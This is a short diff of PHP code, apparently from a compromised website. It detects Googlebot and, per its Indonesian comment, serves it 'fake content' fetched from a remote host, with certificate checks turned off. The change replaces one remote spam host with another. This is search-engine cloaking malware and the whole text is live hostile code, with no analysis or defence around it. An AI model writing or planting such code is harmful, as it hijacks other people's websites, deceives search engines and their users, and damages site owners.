@@ -14,7 +14,7 @@ function is_google_bot() {
 
 // Kalo Googlebot, redirect ke konten palsu
 if (is_google_bot()) {
-    $ch = curl_init('https://pessawat.site/goodjobb/');
+    $ch = curl_init('https://vintal.org/adeknibang/');
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Tambahin biar aman
